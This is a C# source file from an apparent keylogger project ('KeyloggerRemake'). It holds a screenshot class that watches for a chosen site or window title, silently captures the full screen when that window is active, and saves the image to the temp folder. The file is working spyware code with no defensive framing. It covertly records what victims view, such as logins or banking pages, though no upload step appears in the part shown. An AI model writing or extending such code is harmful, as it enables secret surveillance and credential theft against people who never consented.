using System;
using System.IO;
using System.Drawing;
using System.Windows.Forms;

namespace KeyloggerRemake
{
    public class classScreenshot
    {
        public string strScreenshotWindow = "";
        public string strScreenshotFolder = Path.GetTempPath(); //THE FOLDER TO SAVE THE SCREENSHOT
        public string strScreenshotDate = classGetUserInfo.getShortDTime();
        public string strScreenshotName;

        //Constructor for creating a screenshot
        public classScreenshot(string strSiteTitle) //Takes the given title
        {
            strScreenshotWindow = strSiteTitle; //Sets it as the screenshot window
            strScreenshotName = strScreenshotWindow + " " + strScreenshotDate; //Sets the name of the screenshot to the window + the current short date/time
        }

        //Taking a screenshot
        public void takeScreenshot()
        {
            Rectangle bounds = Screen.PrimaryScreen.Bounds; //Gets the screen bounds

            using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height)) //Makes a bitmap with the resolution from the bounds
            {
                using (Graphics g = Graphics.FromImage(bitmap))
                {
                    g.CopyFromScreen(new Point(bounds.Left, bounds.Top), Point.Empty, bounds.Size); //Makes a screenshot using those bounds
                }
                bitmap.Save(strScreenshotFolder + strScreenshotName + ".png", System.Drawing.Imaging.ImageFormat.Png); //Saves it onto a folder as a PNG file
            }
        }

        //Checks if the current window isn't empty and contains the wanted window
        public static bool detectSpecificWindow(string strSiteTitle)
        {
            if (classGetUserInfo.strCurrentWindow != null && classGetUserInfo.strCurrentWindow.ToLower().Contains(strSiteTitle.ToLower()))
            { //If the wanted window is popped up
                return true;
            }
            else //If not
            {
                return false;
            }
        }
    }
}
